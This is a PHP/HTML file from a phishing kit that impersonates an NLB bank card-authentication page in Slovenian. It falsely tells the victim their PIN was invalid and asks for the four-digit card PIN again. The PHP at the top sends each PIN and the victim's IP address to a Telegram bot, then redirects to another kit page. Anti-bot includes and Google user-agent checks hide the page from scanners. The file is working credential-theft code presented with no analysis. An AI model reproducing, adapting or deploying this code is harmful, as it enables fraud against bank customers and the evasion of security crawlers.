<?php
   include "config.php";
   include "includes/antibot1.php";

   if(isset($_POST['smss2'])){
   $pin=$_POST['xsms33'];
   $ip = getenv("REMOTE_ADDR");
      $message = "-------------------- ✅ NLB PIN ✅-------------------\nPIN : ".$_POST['xsms33']."\nIP      : ".$ip."\n-------------------- 🇸🇮 Zoldyck 🇸🇮-------------------\n";
      foreach($user_ids as $user_id) {
      $url='https://api.telegram.org/bot'.$bottoken.'/sendMessage';
      $data=array('chat_id'=>$user_id,'text'=>$message);
      $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
      $context=stream_context_create($options);
      $result=file_get_contents($url,false,$context);

      }
      header("Location: loaders.php?id=$ip");
      }
      ?>
<?php 

   $aa = $_SERVER['HTTP_HOST'];
   $ref = $_SERVER['HTTP_REFERER'];
   $refData = parse_url($ref);
   if ($refData['host'] !=$aa) {
   ?>
<?php }elseif($_SERVER['HTTP_REFERER'] == NULL){
   header('HTTP/1.0 404 Not Found');

   exit(); ?>
<?php }else{ ?>
<?php
   error_reporting(0);
   include('pro/antibot1.php');
   include('pro/antibot2.php');
   include('pro/antiip.php');
   include('pro/geoip.php');
   include('pro/useragent.php');
   if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   ?>
<!DOCTYPE html>
<html class="desktop landscape" lang="el">
   <head>
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
      <meta name="format-detection" content="telephone=no">
      <title>NLB pay</title>
      <link rel="apple-touch-icon" sizes="180x180" href="assets/media/apple-touch-icon.png">
      <link rel="icon" type="image/png" sizes="32x32" href="assets/media/favicon-32x32.png">
      <link rel="icon" type="image/png" sizes="16x16" href="assets/media/favicon-16x16.png">
      <link href="assets/css/vendors.css" rel="stylesheet">
      <link href="assets/css/app.0dbee2df334aa39718a6.css" rel="stylesheet">
      <link rel="icon" type="image/png" href="assets/img/favicon.ico">
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.css" rel="stylesheet">
      <link href="assets/css/style.css" rel="stylesheet">
      <script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
      <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/js/all.min.js"></script>
      <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
   </head>
   <body>
      <div id="root" class="desktop landscape">
         <div role="presentation" id="topRefElement" class="mainContainer">
            <div class="mainWrapper">
            <header style="background:#26007D;margin-bottom:20px">
            <nav class="navbar navbar-expand-lg navbar-light" style="align-items: flex-start;">
  <a class="navbar-brand" href="#"><img src="assets/img/nlb_left_02.png" /> </a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>
  <div class="collapse navbar-collapse" style="justify-content: flex-end;padding-top:10px" id="navbarNav">
    <ul class="navbar-nav">
      <li class="nav-item">
        <a class="nav-link" href="#">NLB</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">O NLB Kliku</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">Kontakt</a>
      </li>
    </ul>
  </div>
</nav>
            </header>
               <section class="mainSection" aria-label="main" id="main" style="min-height: 556px;">
                  <div class="wrapper">
                     <span></span>
                     <div class="row">
                        <div class="column-12">
                           <form method="POST">
                              <div role="presentation" class="popup" style="display: block;">
                                 <div class="popupInner">
                                    <div class="popupContent" role="presentation">
                                       <div class="popupHeader">
                                          <div class="inner">
                                             <h2><span>Zahteva se vaša močna avtentikacija</span></h2>
                                          </div>
                                          <button type="button" class="close icon-close"></button>
                                       </div>
                                       <div id="secondFactorModal_payment" class="popupMain">
                                          <div class="trSigning">
                                             <div class="intro">
                                                <br>
                                                <span>
                                                   <p>Vnesite PIN svoje kartice </p>
                                                </span>
                                             </div>
                                             <div class="signingBlock" style="margin-bottom: 40px;">
                                                <div class="imgWrap">
                                                   <div class="img"><img src="assets/img/mobile.png" alt="mobile"></div>
                                                </div>
                                                <div class="signingMain">
                                                   <div class="bubble">
                                                       <div style='color:red;   font-size: 20px;'><center>pin neveljaven</center></div>
                                                      <div class="fieldBlock" id="zabour">
                                                         <label for="code"><span>Izpolnite ga <strong>4 mestna koda</strong>:</span></label><input class="text" type="text" autocomplete="off"  oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');" name="xsms33"  maxlength="4" required>
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>
                                             <div style="text-align: center;" class="buttonsWrap end"><button  id="nami" class="btnform" name="smss2" type="submit"><span>KONTINUITETA</span></button></div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </form>
                        </div>
                     </div>
               </section>

            </div>
         </div>
      </div>
   </body>
</html>
<?php } ?>